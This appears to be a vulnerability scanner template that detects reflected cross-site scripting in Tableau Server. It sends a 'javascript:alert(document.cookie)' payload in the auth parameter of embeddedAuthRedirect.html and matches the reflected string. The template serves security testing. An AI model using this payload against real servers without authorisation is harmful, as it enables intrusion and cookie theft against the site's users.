id: Tableau Server XSS
info:
  author: pikpikcu
  name: Tableau Server XSS
  severity: medium
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - javascript:alert(document.cookie)
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/en/embeddedAuthRedirect.html?auth=javascript:alert(document.cookie)'
